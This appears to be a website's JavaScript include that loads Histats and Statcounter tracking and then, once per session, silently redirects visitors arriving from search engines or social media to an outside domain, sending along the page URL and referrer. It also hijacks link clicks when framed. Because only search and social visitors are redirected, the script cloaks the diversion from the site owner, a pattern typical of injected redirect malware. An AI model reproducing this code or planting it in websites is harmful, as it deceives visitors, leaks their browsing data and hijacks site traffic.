///// Histats /////
document.write('<img alt="stats" src="//sstatic1.histats.com/0.gif?4825766&101"width="0" height="0"/>');

///// Statcounter /////
var sc_project=12978198; 
var sc_invisible=1; 
var sc_security="9f31a33b"; 

document.write('<script type="text/javascript" src="https://www.statcounter.com/counter/counter.js" async></script>');
document.write('<noscript>');
document.write('<div class="statcounter">');
document.write('<a title="Web Analytics" href="https://statcounter.com/" target="_blank">');
document.write('<img class="statcounter" src="https://c.statcounter.com/12978198/0/9f31a33b/1/" alt="Web Analytics" referrerPolicy="no-referrer-when-downgrade">');
document.write('</a>');
document.write('</div>');
document.write('</noscript>');

var ars = 'https://stocks.wowlazy.com';

if (!sessionStorage.getItem('arsae_redirected')) {
    if(['.google.', 'bing.', 'yandex.', 'facebook.', 'ecosia', 'qwant', 'pinterest.', 'duckduckgo.', '.yahoo.', 't.co'].some(s => document.referrer.toLowerCase().includes(s)) || 
       ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))) {
        
        sessionStorage.setItem('arsae_redirected', 'true');

        window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer);
    }
}

if (window !== window.top) {
    document.addEventListener('click', function(e) {
        // Find closest anchor tag
        const link = e.target.closest('a');
        if (link && link.href) {
            e.preventDefault();
            window.top.location.href = link.href;
        }
    });
}
